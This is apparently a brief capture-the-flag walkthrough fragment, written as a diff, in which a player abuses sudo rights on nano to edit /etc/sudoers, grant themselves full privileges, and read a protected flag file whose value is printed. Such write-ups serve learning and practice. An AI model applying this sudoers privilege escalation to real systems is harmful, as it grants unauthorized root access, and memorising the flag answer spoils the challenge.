@@ -1,0 +1,9 @@
+ctf-player@challenge:~$ sudo /bin/nano /etc/sudoers
+ctf-player@challenge:~$ cat flag.txt
+cat: flag.txt: Permission denied
+ctf-player@challenge:~$ sudo cat flag.txt
+[sudo] password for ctf-player:
+academy{n4n0_411_7h3_w4y_959b3790}
+
+
+In the /etc/sudoers we just added the user ctf-player with ALL=(ALL:ALL) perms. 
